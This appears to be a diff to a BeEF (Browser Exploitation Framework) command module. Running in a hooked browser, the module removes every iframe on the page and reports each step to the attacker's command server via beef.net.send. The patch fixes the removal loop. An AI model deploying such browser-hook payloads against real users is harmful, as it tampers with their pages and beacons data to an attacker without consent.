@@ -21,8 +21,7 @@ beef.execute(function() {
 		var iframe_count = iframes.length;
 		for(var i=0; i<iframe_count; i++){
 			beef.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe_result=iframe'+i+'_found');
-			//iframes[i].parentNode.removeChild(iframes[i]);
-			document.body.removeChild(iframes[0]);
+			iframes[i].parentNode.removeChild(iframes[i]);
 			beef.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe_result=iframe'+i+'_removed');
 		}
 		var iframe_ = "Info: "+ iframe_count +" iframe(s) processed";
